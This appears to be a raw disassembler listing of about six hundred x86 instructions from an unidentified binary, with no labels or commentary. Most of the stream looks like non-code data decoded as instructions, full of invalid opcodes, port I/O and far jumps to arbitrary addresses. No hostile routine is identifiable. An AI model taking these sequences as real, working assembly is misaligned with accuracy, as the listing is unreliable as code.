  42ad2c:	jecxz  0x42ad98
  42ad2e:	scas   al,BYTE PTR es:[edi]
  42ad2f:	adc    ebx,DWORD PTR [edx]
  42ad31:	lds    esp,FWORD PTR [esi+eiz*1]
  42ad34:	pop    ss
  42ad35:	les    ecx,FWORD PTR [ebx]
  42ad37:	add    BYTE PTR [eax],al
  42ad39:	inc    eax
  42ad3a:	mov    al,BYTE PTR [eax]
  42ad3c:	add    BYTE PTR [ebx],bl
  42ad3e:	mov    al,0xda
  42ad40:	sub    dh,0x0
  42ad43:	add    BYTE PTR [edx],bl
  42ad45:	mov    ebx,0x641042fe
  42ad4a:	or     eax,0x70336c69
  42ad4f:	mov    bh,BYTE PTR [edi-0x27]
  42ad52:	es pushf 
  42ad54:	sbb    BYTE PTR [edx+ebx*8],al
  42ad57:	add    BYTE PTR [eax],al
  42ad59:	(bad)  
  42ad5a:	cmp    DWORD PTR [eax-0x61],ebp
  42ad5d:	enter  0xcb,0x0
  42ad61:	pusha  
  42ad62:	fs mov eax,0xf065c1c3
  42ad68:	test   al,0x8d
  42ad6a:	sbb    ax,0x59c7
  42ad6e:	sbb    al,0x8d
  42ad70:	fsubr  DWORD PTR [eax+0x6d]
  42ad73:	std    
  42ad74:	cld    
  42ad75:	mov    eax,ds:0xbca9c336
  42ad7a:	pop    ds
  42ad7b:	imul   ecx,esi,0xffffff80
  42ad7e:	fiadd  DWORD PTR [eax]
  42ad80:	add    BYTE PTR [ebp+0x19],ch
  42ad83:	rol    DWORD PTR [esi+0x65],0xb5
  42ad87:	addr16 pushf 
  42ad89:	jnp    0x42ad88
  42ad8b:	jmp    0x42ade8
  42ad8d:	test   DWORD PTR [ebp+0x12],ecx
  42ad90:	lds    esi,FWORD PTR [edx-0xd]
  42ad93:	rol    DWORD PTR [ecx+eiz*8-0x6f90000],0x10
  42ad9b:	xor    ebx,DWORD PTR [edx]
  42ad9d:	sbb    esi,DWORD PTR [esi-0x2524eeaa]
  42ada3:	mov    fs,WORD PTR [edi+eiz*2+0xf3c0]
  42adaa:	in     eax,0x75
  42adac:	pop    ebp
  42adad:	lods   al,BYTE PTR ds:[esi]
  42adae:	xchg   ebx,eax
  42adaf:	sbb    DWORD PTR [edx-0x21e73537],eax
  42adb5:	ficom  WORD PTR [ecx-0xe3f96ea]
  42adbb:	add    BYTE PTR [eax],al
  42adbd:	outs   dx,BYTE PTR ds:[esi]
  42adbe:	push   0x46
  42adc0:	leave  
  42adc1:	jnp    0x42ad64
  42adc3:	mov    esi,0xd0fed74
  42adc8:	add    al,0x8e
  42adca:	add    BYTE PTR [eax],al
  42adcc:	aam    0x71
  42adce:	(bad)  
  42adcf:	scas   eax,DWORD PTR es:[edi]
  42add0:	ins    DWORD PTR es:[edi],dx
  42add1:	gs adc cl,ch
  42add4:	pop    esp
  42add5:	push   ds
  42add6:	and    al,0xf0
  42add8:	pop    ebx
  42add9:	icebp  
  42adda:	jae    0x42ada1
  42addc:	rcl    BYTE PTR ds:0x656cc3b9,1
  42ade2:	mov    esi,0x6674acdf
  42ade7:	das    
  42ade8:	pushf  
  42ade9:	adc    esp,esp
  42adeb:	adc    BYTE PTR [ecx],bh
  42aded:	imul   edi,DWORD PTR [edi-0x34],0x73000021
  42adf4:	icebp  
  42adf5:	add    ebx,0x63842090
  42adfb:	add    BYTE PTR [eax],al
  42adfd:	ret    
  42adfe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42adff:	or     BYTE PTR [esi],ch
  42ae01:	add    BYTE PTR [eax],al
  42ae03:	sbb    edi,0x66
  42ae06:	xor    al,0x9c
  42ae08:	es inc esp
  42ae0a:	adc    eax,0x7b0c0000
  42ae0f:	add    BYTE PTR [eax],al
  42ae11:	jl     0x42ae12
  42ae13:	adc    esp,DWORD PTR [esi+edi*2-0x30]
  42ae17:	jns    0x42add9
  42ae19:	adc    al,0x0
  42ae1b:	add    BYTE PTR [edi-0x37],ah
  42ae1e:	jmp    0x42ae4b
  42ae20:	pop    edx
  42ae21:	out    dx,eax
  42ae22:	das    
  42ae23:	sbb    edx,eax
  42ae25:	call   FWORD PTR [edx+0x78]
  42ae28:	je     0x42adfb
  42ae2a:	dec    esp
  42ae2b:	xlat   BYTE PTR ds:[ebx]
  42ae2c:	add    BYTE PTR [eax],al
  42ae2e:	xor    BYTE PTR [edx-0x45f5431f],ah
  42ae34:	leave  
  42ae35:	xchg   esp,eax
  42ae36:	ins    BYTE PTR es:[edi],dx
  42ae37:	(bad)  
  42ae39:	(bad)  [eax]
  42ae3b:	repz xchg ecx,eax
  42ae3d:	fcom   st(6)
  42ae3f:	or     edx,0x7d
  42ae42:	jae    0x42adca
  42ae44:	xchg   esp,eax
  42ae45:	mov    eax,0x51c2ff82
  42ae4a:	add    esi,0xffffffa9
  42ae4d:	jnp    0x42ae62
  42ae4f:	xor    cl,dh
  42ae51:	jae    0x42ae59
  42ae53:	pop    ss
  42ae54:	iret   
  42ae55:	mov    ch,0x25
  42ae57:	aam    0xd8
  42ae59:	mov    ch,0x77
  42ae5b:	cld    
  42ae5c:	scas   eax,DWORD PTR es:[edi]
  42ae5d:	lock add al,bh
  42ae60:	add    BYTE PTR [eax],al
  42ae62:	or     eax,0x174016
  42ae67:	add    BYTE PTR ds:0xf269e90a,bl
  42ae6d:	inc    eax
  42ae6e:	fadd   DWORD PTR [eax]
  42ae70:	add    BYTE PTR [esi-0x20],dh
  42ae73:	outs   dx,DWORD PTR ds:[esi]
  42ae74:	inc    ecx
  42ae75:	sti    
  42ae76:	jmp    0x0:0xda801f90
  42ae7d:	pop    ecx
  42ae7e:	icebp  
  42ae7f:	inc    edx
  42ae80:	(bad)  
  42ae81:	fs ja  0x42aef0
  42ae84:	imul   ebx,DWORD PTR [esi-0x10],0x119cc38e
  42ae8b:	cdq    
  42ae8c:	imul   edx,DWORD PTR [ebp+0x64ed4265],0xfffffff8
  42ae93:	adc    esi,0x57
  42ae96:	sbb    al,0xb5
  42ae98:	ret    
  42ae99:	aaa    
  42ae9a:	out    0x28,eax
  42ae9c:	jl     0x42aec5
  42ae9e:	rol    BYTE PTR [ebp+0x0],0x0
  42aea2:	xchg   edx,eax
  42aea3:	es das 
  42aea5:	pop    es
  42aea6:	mov    dl,ch
  42aea8:	cld    
  42aea9:	fcom   QWORD PTR [ebx+0xe115ff4]
  42aeaf:	retf   
  42aeb0:	dec    eax
  42aeb1:	or     al,0x0
  42aeb3:	add    BYTE PTR [ebp-0x7d],dh
  42aeb6:	xor    al,0x42
  42aeb8:	push   0xc8226b3
  42aebd:	hlt    
  42aebe:	add    BYTE PTR [eax],al
  42aec0:	sbb    eax,0x5b
  42aec3:	or     al,0x0
  42aec5:	add    BYTE PTR [eax],al
  42aec7:	mov    BYTE PTR [eax+eax*1],bh
  42aeca:	add    ch,bl
  42aecc:	(bad)  
  42aece:	aad    0xb3
  42aed0:	daa    
  42aed1:	sbb    al,0xb6
  42aed3:	mov    ebp,0x7de8d56f
  42aed9:	or     al,0x40
  42aedb:	add    BYTE PTR [eax],al
  42aedd:	sub    dh,bl
  42aedf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42aee0:	adc    al,0x9a
  42aee2:	into   
  42aee3:	mov    dl,0x4
  42aee5:	in     eax,dx
  42aee6:	add    BYTE PTR [eax],al
  42aee8:	cs iret 
  42aeea:	emms   
  42aeec:	shl    DWORD PTR [edi],cl
  42aeee:	or     eax,0x409a0ead
  42aef3:	add    BYTE PTR fs:[eax],al
  42aef6:	fnstenv [eax-0x40]
  42aef9:	cmp    BYTE PTR [eax],al
  42aefb:	add    BYTE PTR [edi+0x78c3b41b],dh
  42af01:	or     BYTE PTR [ebp-0x32f0000],al
  42af07:	test   BYTE PTR [edx+0x410d0000],dl
  42af0d:	jns    0x42af71
  42af0f:	jnp    0x42aecf
  42af11:	adc    esp,DWORD PTR [ebx*1+0x1068656b]
  42af18:	pop    ebp
  42af19:	push   eax
  42af1a:	xor    BYTE PTR cs:[ebx],0x0
  42af1e:	add    BYTE PTR [ebp-0x56],bl
  42af21:	(bad)
  42af24:	fild   WORD PTR [eax]
  42af26:	add    BYTE PTR [edx],dl
  42af28:	push   edi
  42af29:	xchg   edi,eax
  42af2a:	shr    esp,1
  42af2c:	dec    esi
  42af2d:	add    DWORD PTR ds:0x73dfa51c,esp
  42af33:	fistp  DWORD PTR [esi+0x77]
  42af36:	mov    dh,0x26
  42af38:	outs   dx,BYTE PTR ds:[esi]
  42af39:	jnp    0x42af8a
  42af3b:	dec    cx
  42af3d:	cli    
  42af3e:	dec    ecx
  42af3f:	sub    ecx,DWORD PTR [ebx]
  42af41:	add    ecx,DWORD PTR [ecx+esi*8]
  42af44:	add    BYTE PTR [eax],al
  42af46:	pop    esi
  42af47:	pushf  
  42af48:	retf   
  42af49:	pop    eax
  42af4a:	jmp    DWORD PTR [ebp+0x7b]
  42af4d:	sahf   
  42af4e:	or     ebp,esp
  42af50:	jl     0x42af8a
  42af52:	out    0x79,eax
  42af54:	fdivr  st(4),st
  42af56:	out    dx,eax
  42af57:	dec    edx
  42af58:	adc    eax,DWORD PTR [ecx+0x4ac001f9]
  42af5e:	add    BYTE PTR [eax],al
  42af60:	push   ecx
  42af61:	imul   esi,DWORD PTR [edx-0x50],0x1abc2f49
  42af68:	out    dx,al
  42af69:	cld    
  42af6a:	xchg   esp,eax
  42af6b:	arpl   WORD PTR [eax],dx
  42af6d:	pop    edx
  42af6e:	inc    eax
  42af6f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42af70:	add    BYTE PTR [eax],al
  42af72:	lds    ecx,FWORD PTR [edi]
  42af74:	std    
  42af75:	or     DWORD PTR [ebx+edi*4-0x38],ebp
  42af79:	mov    WORD PTR [eax],es
  42af7b:	add    BYTE PTR [ecx+0x40501eda],ah
  42af81:	jle    0x42af83
  42af83:	add    BYTE PTR [edx+0x702ee22e],ah
  42af89:	cdq    
  42af8a:	loop   0x42af3e
  42af8c:	lods   eax,DWORD PTR ds:[esi]
  42af8d:	inc    ebx
  42af8e:	add    bh,BYTE PTR [ebx+ecx*1+0x6]
  42af92:	loopne 0x42af2b
  42af94:	push   ss
  42af95:	enter  0x9e,0x0
  42af99:	jecxz  0x42af31
  42af9b:	and    ch,BYTE PTR ds:0x4efacdf5
  42afa1:	mov    eax,DWORD PTR [ebx+edi*1-0x655f0000]
  42afa8:	repnz inc ebp
  42afaa:	fldcw  WORD PTR [ebx-0x4cdd4bec]
  42afb0:	push   cs
  42afb1:	jle    0x42af35
  42afb3:	or     cl,cl
  42afb5:	pop    ebx
  42afb6:	jnp    0x42aff3
  42afb8:	fstp   QWORD PTR [eax+0x47f61f6b]
  42afbe:	pop    esp
  42afbf:	mov    ecx,0x4b7f3cf5
  42afc4:	and    bl,BYTE PTR [eax+0x4467654a]
  42afca:	cld    
  42afcb:	add    BYTE PTR [eax],al
  42afcd:	int3   
  42afce:	loope  0x42afd0
  42afd0:	add    BYTE PTR [ecx-0xb],dl
  42afd3:	jne    0x42b050
  42afd5:	inc    esp
  42afd6:	or     DWORD PTR [eax],eax
  42afd8:	add    BYTE PTR [ebx-0x76],ch
  42afdb:	and    DWORD PTR [edx],0x7832bc69
  42afe1:	push   0xffffff80
  42afe3:	cmp    al,BYTE PTR [eax]
  42afe5:	add    BYTE PTR [eax+0x1a],bh
  42afe8:	push   0x67
  42afea:	into   
  42afeb:	jg     0x42aff3
  42afed:	adc    DWORD PTR [esi],ecx
  42afef:	jle    0x42afaa
  42aff1:	gs or  dl,dl
  42aff4:	enter  0x38,0x0
  42aff8:	mov    esp,0x167e85c
  42affd:	shr    BYTE PTR [esi-0x1340000],0x0
  42b004:	add    bh,dl
  42b006:	aaa    
  42b007:	and    BYTE PTR [esi+0x0],0x0
  42b00b:	pop    ecx
  42b00c:	in     al,dx
  42b00d:	mov    esp,0xfda079d
  42b012:	jl     0x42afe6
  42b014:	pop    es
  42b015:	sub    DWORD PTR [edx-0x32],ebx
  42b018:	pextrw esp,(bad),0xc5
  42b01a:	addr16 inc esp
  42b01c:	ret    0x0
  42b01f:	loop   0x42b09a
  42b021:	push   0x6fa51f0b
  42b026:	es jmp 0x42b002
  42b029:	pushf  
  42b02a:	adc    ecx,DWORD PTR [ecx-0x537f945b]
  42b030:	add    BYTE PTR [eax],al
  42b032:	jmp    0x37a5:0xd2e63f4b
  42b039:	xchg   dh,ch
  42b03b:	shl    DWORD PTR [edi],0xdb
  42b03e:	out    dx,al
  42b03f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b040:	mov    bl,0xf1
  42b042:	jmp    0x371c:0x5dbbce38
  42b049:	sti    
  42b04a:	pop    ebp
  42b04b:	ret    
  42b04c:	aaa    
  42b04d:	(bad)  
  42b04e:	push   ss
  42b04f:	mov    bh,0xce
  42b051:	sar    ebp,1
  42b053:	jmp    0x42b023
  42b055:	aaa    
  42b056:	std    
  42b057:	xchg   edi,eax
  42b058:	into   
  42b059:	cmp    ebp,edi
  42b05b:	ret    
  42b05c:	aaa    
  42b05d:	jle    0x42b05c
  42b05f:	aaa    
  42b060:	into   
  42b061:	jno    0x42b045
  42b063:	retf   
  42b064:	into   
  42b065:	inc    ecx
  42b066:	std    
  42b067:	sbb    al,0xce
  42b069:	jbe    0x42b060
  42b06b:	je     0x42b065
  42b06d:	push   0x251194f5
  42b072:	addr16 mov esp,0x806a54cb
  42b078:	cmp    al,BYTE PTR [eax]
  42b07a:	add    BYTE PTR [ecx+0x21],ch
  42b07d:	jge    0x42b0f0
  42b07f:	imul   BYTE PTR [ecx]
  42b081:	imul   esi,DWORD PTR [ecx],0x78eaa4f2
  42b087:	and    eax,0xe2796451
  42b08c:	mov    bl,0x33
  42b08f:	mov    bl,BYTE PTR [eax+0x5a]
  42b092:	xlat   BYTE PTR ds:[ebx]
  42b093:	cmc    
  42b094:	in     al,0x9a
  42b096:	sbb    bh,BYTE PTR [eax]
  42b098:	xchg   esp,eax
  42b099:	aaa    
  42b09a:	js     0x42b0b4
  42b09c:	jge    0x42b10e
  42b09e:	sub    eax,0x88f7015d
  42b0a3:	add    eax,DWORD PTR [eax]
  42b0a5:	add    BYTE PTR [ebx+0x5d9c773a],cl
  42b0ab:	outs   dx,BYTE PTR ds:[esi]
  42b0ac:	pop    ecx
  42b0ad:	dec    esp
  42b0ae:	add    al,BYTE PTR [eax]
  42b0b0:	add    bh,dh
  42b0b2:	jne    0x42b0c1
  42b0b4:	sub    al,0x70
  42b0b6:	push   esp
  42b0b7:	or     ebp,DWORD PTR [esi+0x79]
  42b0ba:	(bad)
  42b0bd:	or     ah,bl
  42b0bf:	shl    BYTE PTR [esi+0x0],0x0
  42b0c3:	scas   al,BYTE PTR es:[edi]
  42b0c4:	popf   
  42b0c5:	stos   DWORD PTR es:[edi],eax
  42b0c6:	fdiv   DWORD PTR [edx-0x6]
  42b0c9:	in     al,dx
  42b0ca:	ficom  WORD PTR [esi+0x7ca35216]
  42b0d0:	sbb    eax,0x4c44c7ff
  42b0d5:	add    BYTE PTR [eax],al
  42b0d7:	stos   BYTE PTR es:[edi],al
  42b0d8:	ja     0x42b0f4
  42b0da:	xchg   ebp,eax
  42b0db:	mov    edx,0x118e27e9
  42b0e0:	jae    0x42b0ab
  42b0e2:	jl     0x42b086
  42b0e4:	(bad)  
  42b0e6:	xchg   ecx,eax
  42b0e7:	sbb    al,0x86
  42b0e9:	stc    
  42b0ea:	js     0x42b13b
  42b0ec:	mov    cl,0xda
  42b0ee:	mov    BYTE PTR [ecx],cl
  42b0f0:	add    BYTE PTR [eax],al
  42b0f2:	mov    eax,eax
  42b0f4:	repnz add BYTE PTR [eax],al
  42b0f7:	aad    0xa4
  42b0f9:	pop    eax
  42b0fa:	jne    0x42b084
  42b0fc:	push   edx
  42b0fd:	add    BYTE PTR [eax],al
  42b0ff:	adc    BYTE PTR [eax+0x5c55d501],0x3f
  42b106:	sub    edx,DWORD PTR [ebp+0x41]
  42b109:	or     edi,DWORD PTR [esi-0x44]
  42b10c:	or     DWORD PTR [esi+0x61c4516b],esi
  42b112:	add    BYTE PTR [eax],al
  42b114:	ficom  WORD PTR [ecx+eax*1]
  42b117:	into   
  42b118:	dec    ecx
  42b119:	cmc    
  42b11a:	in     eax,0xfc
  42b11c:	or     al,0xa6
  42b11e:	add    BYTE PTR [eax],al
  42b120:	loop   0x42b19b
  42b122:	retf   
  42b123:	repz cli 
  42b125:	in     eax,0xc2
  42b127:	out    dx,al
  42b128:	cli    
  42b129:	add    esi,ecx
  42b12b:	inc    ebp
  42b12c:	cmc    
  42b12d:	in     eax,0x75
  42b12f:	or     BYTE PTR [eax],cl
  42b131:	add    BYTE PTR [eax],al
  42b133:	(bad)  
  42b134:	js     0x42b1a7
  42b136:	iret   
  42b137:	nop
  42b138:	lds    esi,FWORD PTR [ecx-0x16]
  42b13b:	cli    
  42b13c:	add    esi,ecx
  42b13e:	inc    ecx
  42b13f:	cmc    
  42b140:	lds    ebp,FWORD PTR [ebp+0x4]
  42b143:	push   ebp
  42b144:	add    BYTE PTR [eax],al
  42b146:	out    dx,eax
  42b147:	jns    0x42b1ba
  42b149:	retf   
  42b14a:	adc    BYTE PTR [ebp-0x3eec198b],ah
  42b150:	jne    0x42b0ef
  42b152:	in     al,dx
  42b153:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b154:	jno    0x42b196
  42b156:	push   ebx
  42b157:	add    BYTE PTR [eax],al
  42b159:	in     eax,0x58
  42b15b:	jo     0x42b144
  42b15d:	xchg   edi,eax
  42b15e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b15f:	add    al,0xf8
  42b161:	add    BYTE PTR [eax],al
  42b163:	and    esp,esp
  42b165:	shl    DWORD PTR [ebp-0x67],0xec
  42b169:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b16a:	call   FWORD PTR [eax+ebp*8+0x39]
  42b16e:	enter  0x63,0x0
  42b172:	add    edi,edi
  42b174:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b175:	enter  0xb7,0x0
  42b179:	ds jmp 0xc8a5:0xec9575c1
  42b181:	hlt    
  42b182:	add    BYTE PTR [eax],al
  42b184:	pop    eax
  42b185:	push   eax
  42b186:	cmp    ebx,eax
  42b188:	pop    ds
  42b189:	loop   0x42b150
  42b18b:	jl     0x42b1d8
  42b18d:	in     al,0xc1
  42b18f:	jne    0x42b122
  42b191:	in     al,dx
  42b192:	vandps xmm5,xmm0,xmm3
  42b196:	cmp    esi,ecx
  42b198:	sbb    esi,ebp
  42b19a:	in     eax,0x41
  42b19c:	aaa    
  42b19d:	cmc    
  42b19e:	add    esi,ecx
  42b1a0:	sub    eax,0x1064e5f5
  42b1a5:	cmc    
  42b1a6:	pop    ecx
  42b1a7:	retf   
  42b1a8:	idiv   edx
  42b1aa:	in     eax,0x69
  42b1ac:	repnz inc BYTE PTR [ecx]
  42b1af:	into   
  42b1b0:	sub    ebp,esi
  42b1b2:	in     eax,0x9e
  42b1b4:	sar    esp,1
  42b1b6:	jns    0x42b17e
  42b1b8:	sar    ebp,cl
  42b1ba:	in     eax,0x20
  42b1bc:	into   
  42b1bd:	in     eax,dx
  42b1be:	add    esi,ecx
  42b1c0:	and    eax,0xe873e5f5
  42b1c5:	adc    BYTE PTR [ecx+0x7e],bh
  42b1c8:	scas   eax,DWORD PTR es:[edi]
  42b1c9:	in     eax,0xc5
  42b1cb:	jo     0x42b197
  42b1cd:	adc    DWORD PTR [ecx],eax
  42b1cf:	into   
  42b1d0:	and    ebp,esi
  42b1d2:	int3   
  42b1d3:	or     eax,DWORD PTR [eax]
  42b1d5:	add    BYTE PTR [ecx-0x1c],dh
  42b1d8:	sar    DWORD PTR [ecx+0x7e],cl
  42b1db:	stos   DWORD PTR es:[edi],eax
  42b1dc:	in     eax,0xa5
  42b1de:	jbe    0x42b1a6
  42b1e0:	push   eax
  42b1e1:	sar    BYTE PTR [ecx],0x0
  42b1e4:	add    BYTE PTR [ebp+0x7d],dh
  42b1e7:	in     eax,dx
  42b1e8:	aam    0x6e
  42b1ea:	and    cl,ch
  42b1ec:	pop    ecx
  42b1ed:	jge    0x42b1b6
  42b1ef:	in     al,0xa5
  42b1f1:	jne    0x42b1f5
  42b1f3:	push   esp
  42b1f4:	shl    BYTE PTR [ebx+0x0],0x0
  42b1f8:	jne    0x42b273
  42b1fa:	in     eax,dx
  42b1fb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b1fc:	jp     0x42b23a
  42b1fe:	sbb    bh,BYTE PTR [ecx]
  42b200:	add    al,0x97
  42b202:	add    BYTE PTR [eax],al
  42b204:	xchg   esp,eax
  42b205:	loopne 0x42b1ac
  42b207:	outs   dx,DWORD PTR ds:[esi]
  42b208:	push   ds
  42b209:	sbb    al,al
  42b20b:	adc    BYTE PTR [eax],al
  42b20d:	add    BYTE PTR [ebp+0x75],dh
  42b210:	in     eax,dx
  42b211:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b212:	outs   dx,DWORD PTR ds:[esi]
  42b213:	cmp    dl,dl
  42b215:	cmp    BYTE PTR [ebp-0x1],dh
  42b218:	in     al,dx
  42b219:	lds    esi,FWORD PTR [esi+0x1a]
  42b21c:	std    
  42b21d:	rol    BYTE PTR [eax+0x71750000],0xed
  42b224:	(bad)  
  42b227:	jmp    0x42b262
  42b229:	enter  0x23,0x0
  42b22d:	sti    
  42b22e:	jmp    ebp
  42b230:	inc    ecx
  42b231:	pop    ss
  42b232:	cmc    
  42b233:	add    esi,ecx
  42b235:	or     eax,0xf064e5f5
  42b23a:	std    
  42b23b:	pop    ecx
  42b23c:	add    eax,eax
  42b23e:	loopne 0x42b240
  42b240:	add    dl,ah
  42b242:	in     eax,0x69
  42b244:	sar    ch,cl
  42b246:	add    esi,ecx
  42b248:	or     ebp,esi
  42b24a:	in     eax,0x64
  42b24c:	int3   
  42b24d:	fild   WORD PTR [eax]
  42b24f:	add    bl,ah
  42b251:	jns    0x42b255
  42b253:	mov    ah,0xe1
  42b255:	in     eax,0x76
  42b257:	scas   al,BYTE PTR es:[edi]
  42b258:	clc    
  42b259:	add    esi,ecx
  42b25b:	add    eax,0xc871e5f5
  42b260:	fild   DWORD PTR [eax]
  42b262:	add    dh,ch
  42b264:	jns    0x42b2e1
  42b266:	(bad)
  42b26a:	stos   BYTE PTR es:[edi],al
  42b26b:	out    dx,al
  42b26c:	add    esi,ecx
  42b26e:	add    ebp,esi
  42b270:	xor    al,0x79
  42b272:	les    ebx,FWORD PTR [ecx]
  42b274:	add    BYTE PTR [eax],al
  42b276:	nop
  42b277:	jns    0x42b2f7
  42b279:	mov    esp,DWORD PTR ds:0x55a679a5
  42b27f:	ror    ch,0x0
  42b282:	add    BYTE PTR [ebp+0x5d],dh
  42b285:	lods   eax,DWORD PTR ds:[esi]
  42b286:	aam    0x71
  42b288:	add    BYTE PTR [edi+0x596d0000],ch
  42b28e:	jge    0x42b237
  42b290:	and    al,0xdc
  42b292:	jne    0x42b276
  42b294:	ins    BYTE PTR es:[edi],dx
  42b295:	rol    bh,0x0
  42b298:	add    BYTE PTR [ebp+0x59],dh
  42b29b:	lods   eax,DWORD PTR ds:[esi]
  42b29c:	hlt    
  42b29d:	jne    0x42b2bb
  42b29f:	lods   eax,DWORD PTR ds:[esi]
  42b2a0:	cmp    DWORD PTR [eax-0x3cffff3f],eax
  42b2a6:	daa    
  42b2a7:	pop    esp
  42b2a8:	jns    0x42b2a8
  42b2aa:	test   al,0xc0
  42b2ac:	add    eax,DWORD PTR [eax]
  42b2ae:	add    BYTE PTR [ebp+0x55],dh
  42b2b1:	lods   eax,DWORD PTR ds:[esi]
  42b2b2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b2b3:	ins    BYTE PTR es:[edi],dx
  42b2b4:	sbb    BYTE PTR [ecx+edi*1],ch
  42b2b7:	adc    BYTE PTR [eax+eax*1],0x0
  42b2bb:	fbld   TBYTE PTR [edi]
  42b2bd:	lds    esi,FWORD PTR [edx+edi*8+0x27]
  42b2c1:	rol    BYTE PTR ds:0x51750000,0xad
  42b2c8:	les    esi,FWORD PTR ds:0x14700000
  42b2ce:	nop
  42b2cf:	cmp    DWORD PTR [eax-0x24ffffa3],eax
  42b2d5:	daa    
  42b2d6:	in     eax,0x74
  42b2d8:	fisub  WORD PTR [edi]
  42b2da:	add    DWORD PTR [eax-0x12ffffc8],eax
  42b2e0:	daa    
  42b2e1:	in     eax,0x67
  42b2e3:	shl    BYTE PTR [edi],1
  42b2e5:	pop    ecx
  42b2e6:	or     BYTE PTR [ecx+0x0],0x0
  42b2ea:	mov    bh,0x27
  42b2ec:	in     eax,0x67
  42b2ee:	mov    dl,0x27
  42b2f0:	add    DWORD PTR [eax-0x16ffffdf],eax
  42b2f6:	daa    
  42b2f7:	in     eax,0x67
  42b2f9:	aam    0x16
  42b2fb:	jns    0x42b27d
  42b2fd:	mov    cl,0x0
  42b2ff:	add    BYTE PTR [ebx+0x5a731b27],dl
  42b305:	dec    ebx
  42b306:	add    DWORD PTR [eax-0x5affffa3],eax
  42b30c:	daa    
  42b30d:	mov    ah,0x6e
  42b30f:	test   al,0xd2
  42b311:	jns    0x42b38e
  42b313:	outs   dx,DWORD PTR ds:[esi]
  42b314:	sub    eax,ebp
  42b316:	jb     0x42b2aa
  42b318:	push   edx
  42b319:	add    DWORD PTR [eax-0x1effffdc],eax
  42b31f:	daa    
  42b320:	jl     0x42b390
  42b322:	nop
  42b323:	idiv   DWORD PTR [ecx+0x72]
  42b326:	sub    ebx,DWORD PTR [esi]
  42b328:	and    al,0x72
  42b32a:	xchg   BYTE PTR [ebp+0xd9c0],dl
  42b330:	jb     0x42b36f
  42b332:	push   edx
  42b333:	fs jbe 0x42b39e
  42b336:	push   esi
  42b337:	pop    ecx
  42b338:	jp     0x42b2c1
  42b33a:	sub    DWORD PTR [esi+ebp*2+0x2a],ebx
  42b33e:	repnz shl ch,0x0
  42b342:	add    BYTE PTR [edx-0x7],dh
  42b345:	shl    esp,1
  42b347:	ins    BYTE PTR es:[edi],dx
  42b348:	cld    
  42b349:	ins    BYTE PTR es:[edi],dx
  42b34a:	cmp    DWORD PTR [esi-0x5d],edi
  42b34d:	and    eax,0x536673a5
  42b352:	rcl    BYTE PTR [edx+0x35720000],0x52
  42b359:	cmp    al,0x73
  42b35b:	clc    
  42b35c:	inc    ebp
  42b35d:	cmp    BYTE PTR [eax+0x7f00002f],al
  42b363:	push   ebx
  42b364:	lds    esi,FWORD PTR [edi-0x26]
  42b367:	daa    
  42b368:	sar    BYTE PTR [eax+0x31720000],0x52
  42b36f:	lds    esi,FWORD PTR [ebx-0x44]
  42b372:	daa    
  42b373:	cmp    DWORD PTR [eax-0x44ffffce],eax
  42b379:	daa    
  42b37a:	pop    esp
  42b37b:	xor    BYTE PTR [eax+eax*1+0x1be2600],0x80
  42b383:	js     0x42b385
  42b385:	add    BYTE PTR [ebp-0x4f8d1ad9],cl
  42b38b:	daa    
  42b38c:	pop    ecx
  42b38d:	cmp    BYTE PTR [ebx+0x27970000],0xe9
  42b394:	pushf  
  42b395:	adc    bl,BYTE PTR [esi+0x1]
  42b398:	xor    BYTE PTR [esi+0x27c90000],0xe5
  42b39f:	push   0xffffff8c
  42b3a1:	test   al,0x0
  42b3a3:	add    BYTE PTR [eax],ch
  42b3a5:	jns    0x42b424
  42b3a7:	jae    0x42b3ce
  42b3a9:	in     eax,0x68
  42b3ab:	outs   dx,BYTE PTR ds:[esi]
  42b3ac:	sub    eax,0x3100
  42b3b1:	sbb    BYTE PTR [ebp+0x0],0x0
  42b3b5:	ins    DWORD PTR es:[edi],dx
  42b3b6:	push   esi
  42b3b7:	or     al,0x40
  42b3b9:	add    BYTE PTR [eax],al
  42b3bb:	jo     0x42b345
  42b3bd:	xlat   BYTE PTR ds:[ebx]
  42b3be:	add    BYTE PTR [eax],al
  42b3c0:	nop
  42b3c1:	jnp    0x42b42e
  42b3c3:	pop    ss
  42b3c4:	icebp  
  42b3c5:	les    edx,FWORD PTR [esi+0x2a6f0000]
  42b3cb:	push   ebx
  42b3cc:	inc    ebx
  42b3cd:	xor    BYTE PTR [eax+eax*1+0x7cdc5100],0x73
  42b3d5:	test   BYTE PTR [edi+0x0],dl
  42b3d8:	add    BYTE PTR [ecx+0x79],dl
  42b3db:	ja     0x42b428
  42b3dd:	das    
  42b3de:	clc    
  42b3df:	(bad)  
  42b3e0:	data16 or al,0xe9
  42b3e3:	add    BYTE PTR [eax],al
  42b3e5:	mov    al,BYTE PTR ds:[edx+0x55]
  42b3ec:	add    BYTE PTR [eax],al
  42b3ee:	add    BYTE PTR [eax],al
	...
